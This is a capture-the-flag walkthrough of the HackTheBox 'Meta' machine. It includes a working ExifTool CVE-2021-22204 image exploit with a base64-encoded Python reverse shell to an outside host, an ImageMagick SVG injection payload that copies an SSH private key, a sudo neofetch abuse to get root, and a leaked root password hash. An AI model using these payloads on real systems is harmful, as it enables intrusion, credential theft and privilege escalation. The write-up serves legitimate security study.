# HackTheBox-Meta

## NMAP

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   256 b5:e5:59:53:00:18:96:a6:f8:42:d8:c7:fb:13:20:49 (ECDSA)
|_  256 05:e9:df:71:b5:9f:25:03:6b:d0:46:8d:05:45:44:20 (ED25519)
80/tcp open  http    Apache httpd
|_http-server-header: Apache
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

## PORT 80 (HTTP)

When visiting the site it resovles to domain name `artcorp.htb` , so add this to `hosts` file 

<img src="https://i.imgur.com/HmIYH0u.png"/>

<img src="https://i.imgur.com/hrP22o2.png"/>

So running to fuzz for files and directories using `dirsearch`

<img src="https://i.imgur.com/TJsqUF6.png"/>

It didn't found anything interesting , since we have a domain name , we can fuzz for a subdomain using `wfuzz`

<img src="https://i.imgur.com/ufsdlcd.png"/>

Now adding this to `hosts` file as well

<img src="https://i.imgur.com/L1A1grU.png"/>

<img src="https://i.imgur.com/wFgTZsT.png"/>


Now here it's reading metdata from the image file with extension png or jpeg/jpg , I tried uploading a normal php file which the server responded with file not allowed

<img src="https://i.imgur.com/7yBuqeP.png"/>

So let's try to add a comment which will have a  php command into a legit png file

<img src="https://i.imgur.com/BwaSOSV.png"/>

<img src="https://i.imgur.com/mFDrokS.png"/>

When we upload this to the site , it will remove this php comment

<img src="https://i.imgur.com/BqUP7Br.png"/>

## Foothold

For this there's a CVE (CVE-2021-22204)

<img src="https://i.imgur.com/NxJZ9Tm.png"/>

We can find the POC as well

https://github.com/OneSecCyber/JPEG_RCE

<img src="https://i.imgur.com/afTmIhg.png"/>

Clone the repo and use the `eval.config` file 

```bash
exiftool -config eval.config image.png -eval='system("id")'
```

<img src="https://i.imgur.com/ua2Jnyl.png"/>

On uploading it you'll see the out of the command in `system` 

<img src="https://i.imgur.com/PasTjiU.png"/>

To get a reverse shell we can use python3 to reverse shell payload and to not run into problem quotes problem I base64 encoded the payload so bash doesn't scream about double qutoes and single quotes 

```bash
exiftool -config eval.config image.png -eval='system("echo 'cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEwLjEwLjE0LjEyNSIsMjIyMikpO29zLmR1cDIocy5maWxlbm8oKSwwKTtvcy5kdXAyKHMuZmlsZW5vKCksMSk7b3MuZHVwMihzLmZpbGVubygpLDIpO3N1YnByb2Nlc3MuY2FsbChbIi9iaW4vc2giLCItaSJdKSc=' | base64 -d |bash")'
```

<img src="https://i.imgur.com/q0ljUiv.png"/>

Start the listener and upload the file

<img src="https://i.imgur.com/cwhriG5.png"/>

After getting the shell , stabilize it with python3, checking `sudo -l` and other directories I wasn't able to find anything that could allow us to privesc to `thomas` user, so transfered `pspy` to monitor background processes and found that there was a cron job running as thomas 

<img src="https://i.imgur.com/RfecofJ.png"/>


## Privilege Escalation (Thomas)

If we check the script which is being ran as thomas we can see that it's running `mogrify` , luckily this has an exploit which has command injection 

https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html

<img src="https://i.imgur.com/tcBNnY8.png"/>

So what script is actually doing is naviagting to `convert_images` in web directory and there it's running mogrify to convert image files to png format so we need to place our svg paylod there 

```bash

<image authenticate='ff" `echo $(cat ~/.ssh/id_rsa)> /dev/shm/uwu`;"'>
  <read filename="pdf:/etc/passwd"/>
  <get width="base-width" height="base-height" />
  <resize geometry="400x400" />
  <write filename="test.png" />
  <svg width="700" height="700" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <image xlink:href="msl:poc.svg" height="100" width="100"/>
  </svg>
</image>

```

<img src="https://i.imgur.com/OnnvdE9.png"/>

After waiting for a minute for cron job to run the script 

<img src="https://i.imgur.com/Lojjaj3.png"/>

<img src="https://i.imgur.com/9d7FIpG.png"/>

This will output the contents of thoma's ssh key in  shm folder in a file named `uwu` , now just login through ssh

<img src="https://i.imgur.com/XKi7DWQ.png"/>



## Privilege Escalation (root)

Running `sudo -l` it shows  that we can run `neofetch` as the root user 

<img src="https://i.imgur.com/DDH7vGt.png"/>

Here we can see that `env_reset` is used which means that we can't really exploit PATH variable to replace any command being ran in neofetch but there's `env_keep+=XDG_CONFIG_HOME` which allows us to use this variable for root user 

Launching neofetch with default config

<img src="https://i.imgur.com/R9DFVGw.png"/>

Here we see that it's using the defaut configuration file , now about the `env_keep`  we can abuse neofetch by loading a config file , copy the config file from thomas's directory because the cron job will be replacing thie config file so avoid this we can create a folder `neofetch` and put the config file there

<img src="https://i.imgur.com/a5ig8AE.png"/>

Now make a change to the default config to see if we are able to load a custom config file

<img src="https://i.imgur.com/7TaT4Wt.png"/>

```bash
sudo XDG_CONFIG_HOME=/home/thomas /usr/bin/neofetch
```

<img src="https://i.imgur.com/8ZeBi8R.png"/>

And this time it loads neofetch with showing users so it did work 

Let's try to add a bash command in the config file , it could be any command so I am checking if it can make bash a SUID so we can get root 

<img src="https://i.imgur.com/o5Uf1W4.png"/>

After running it we can see that bash has SUID bit on

<img src="https://i.imgur.com/9BIvG5n.png"/>

<img src="https://i.imgur.com/D84lRzb.png"/>

And with this we got root

## References 

- https://hackerone.com/reports/1154542
- https://github.com/OneSecCyber/JPEG_RCE
- https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html
- https://blog.adithyanak.com/oscp-preparation-guide/linux-privilege-escalation/sudo-abuse


root:$6$C2RdQ0RpQ545cx/2$TMbXaoMwVs7XQVOwEwAnzcUVrIR5CdpVaM3Aoml8p9PWQWvxbrGrh/Y6d2.OuKlSHVsNVS0mJwSoGl.q8Pbug0:18996:0:99999:7:::
